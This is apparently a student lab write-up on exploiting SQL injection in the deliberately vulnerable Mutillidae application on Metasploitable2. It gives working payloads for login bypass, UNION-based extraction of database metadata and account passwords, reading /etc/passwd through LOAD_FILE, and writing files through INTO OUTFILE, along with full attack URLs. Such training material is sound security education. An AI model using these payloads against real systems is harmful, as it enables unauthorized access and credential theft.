
# Exploiting SQL Injection vulnerability

## AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL 

Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database.


Identify IP address using ifconfig in Metasploitable2

![n1](https://github.com/anto-richard/sqlinjection/assets/93427534/bb167257-33ea-4c80-9a44-1b8b96db3f42)


Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.

![n2](https://github.com/anto-richard/sqlinjection/assets/93427534/0bdb2a4b-2712-49e1-9aec-c7d84f9117f5)


Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![n3](https://github.com/anto-richard/sqlinjection/assets/93427534/7ccc3430-6863-4c58-8709-4c7be524e2fe)


Click on the menu Login/Register and register for an account

![n4](https://github.com/anto-richard/sqlinjection/assets/93427534/9eb78e73-94ab-40c6-9882-ec4b0ce0577b)


Click on the link “Please register here”

![n5](https://github.com/anto-richard/sqlinjection/assets/93427534/bfbe32ac-3eca-45c7-b1ae-440282d6ccba)


![n6](https://github.com/anto-richard/sqlinjection/assets/93427534/982b811f-5670-4da9-af26-46e8b39d9e53)


Click on “Create Account” to display the following page:

![n7](https://github.com/anto-richard/sqlinjection/assets/93427534/c2596bf4-6b22-428c-b160-e752d765dafc)


The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username 

and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;).
 
 For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.
 
![n8](https://github.com/anto-richard/sqlinjection/assets/93427534/e705a661-fa0e-43a5-b3ad-6e8eb6090648)


 Click “Login”. The logged in page will show as below:

![n9](https://github.com/anto-richard/sqlinjection/assets/93427534/f36611d1-94d3-4426-a3dd-421ce5f1907b)


 ## Bypassing login field
 The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username 
 
 filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and 

gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.

![n10](https://github.com/anto-richard/sqlinjection/assets/93427534/5fca908a-d475-45a6-8481-44b762a3a49e)


Click the login button and you will see it enter into the administrator page.

![n11](https://github.com/anto-richard/sqlinjection/assets/93427534/4ab34fcf-ebae-4112-9382-e80b6d876952)


## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the 

attacker must craft a “SELECT” statement like the first inquiry. 

we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” 

After logging out, Now choose the menu as shown below:

![n12](https://github.com/anto-richard/sqlinjection/assets/93427534/8cb80022-3b6e-47cf-9785-1efc39c7de8e)


![n13](https://github.com/anto-richard/sqlinjection/assets/93427534/6770ce67-19eb-47d6-90af-50e3b25a20b6)


![n14](https://github.com/anto-richard/sqlinjection/assets/93427534/65295f59-0575-4f35-bf19-b3cf7ab42fb9)


![n15](https://github.com/anto-richard/sqlinjection/assets/93427534/715d7faf-2a20-4e21-a6ae-2bb2f7c1dbcc)


![n16](https://github.com/anto-richard/sqlinjection/assets/93427534/5a0dc7c9-71a6-4018-b918-5e01eac2d598)


From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original 

query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

![n17](https://github.com/anto-richard/sqlinjection/assets/93427534/d42a4791-e782-4c67-a003-eb0972e4076d)


Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we 

incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

![n18](https://github.com/anto-richard/sqlinjection/assets/93427534/c9b40430-92b6-44a0-b746-252510a43f58)


After adding the order by 6 into the existing url , the following error statement will be obtained:

![n19](https://github.com/anto-richard/sqlinjection/assets/93427534/05323fb2-e504-4833-a66e-61711980cca5)


When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 

replacing 6.

![n20](https://github.com/anto-richard/sqlinjection/assets/93427534/de6424a6-3df5-455d-ab40-5a9b4eb08160)


 As it is having 5 columns the query worked fine and it provides the correct result
 
![n21](https://github.com/anto-richard/sqlinjection/assets/93427534/8eebba6a-febf-4ea5-8322-6df753fbfbbd)


 Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5).
 
![n22](https://github.com/anto-richard/sqlinjection/assets/93427534/98166abd-56c0-46d6-828b-733fa71ec752)


 As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.

![n23](https://github.com/anto-richard/sqlinjection/assets/93427534/2f145829-6b66-4259-9867-f418439da96f)


 Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

![n24](https://github.com/anto-richard/sqlinjection/assets/93427534/20b35a51-7558-4866-8aa6-cd53b000bfed)


The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5.

In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one:

union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’


http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

![n26](https://github.com/anto-richard/sqlinjection/assets/93427534/9d8d58e5-41b3-4d2b-af2b-242c6c67de99)


The url once executed will  retrieve table names from the “owasp 10” database.

## Extracting sensitive data such as passwords
When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

![n27](https://github.com/anto-richard/sqlinjection/assets/93427534/2d38fa68-b7c1-4d56-837d-b743ea9c0ac9)


The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details

![n28](https://github.com/anto-richard/sqlinjection/assets/93427534/087890f6-c9eb-4148-b340-b291ee3d4062)


Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![n29](https://github.com/anto-richard/sqlinjection/assets/93427534/cd3c8215-9c78-4e57-834f-95d0ba8638fa)



## Reading and writing files on the web-server

We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and 

passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details

![n30](https://github.com/anto-richard/sqlinjection/assets/93427534/363718e0-b844-4197-bde1-abf5adf7e163)


the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the 

“/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server.

Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).

## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
